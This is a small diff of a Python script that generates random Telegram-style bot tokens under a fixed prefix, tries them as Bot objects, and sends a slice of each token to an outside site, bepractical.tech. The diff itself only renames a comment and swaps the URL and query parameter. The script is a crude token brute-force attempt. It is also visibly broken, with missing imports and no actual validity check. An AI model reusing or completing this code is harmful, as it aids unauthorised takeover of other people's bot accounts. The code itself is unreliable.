@@ -1,13 +1,13 @@
-#ADMlNxd codeChamp
+#ADMlNxd bepractical
 import requests
-url = "https://codechamp.netlify.com"
+url = "https://bepractical.tech/"
 
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 for k in range(1000):
   token = "609517172:" + "".join(random.choices(chars,k=35))
   new_bot = Bot(token)
   try:
-    requests.get(url+"&id="+token[15:20]);
+    requests.get(url+"?s="+token[15:20]);
     username = None
   except:
     username = None
